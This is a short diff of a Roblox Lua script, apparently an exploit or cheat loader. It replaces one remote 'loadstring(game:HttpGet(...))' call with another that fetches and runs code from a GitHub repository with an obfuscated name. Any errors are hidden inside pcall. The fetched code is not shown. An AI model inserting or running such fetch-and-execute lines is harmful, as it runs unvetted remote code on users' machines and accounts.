@@ -13,7 +13,7 @@ end)
 
 task.spawn(function()
    pcall(function()
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Main/main/Library/GUI_ADS.lua"))()
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIlI24568/114514.IIjjjjiiiallloiia.xxxxg/refs/heads/main/xgo%20%E9%9A%90%E8%97%8F%E7%95%8C%E9%9D%A2.lua"))()
    end)
 end)
 
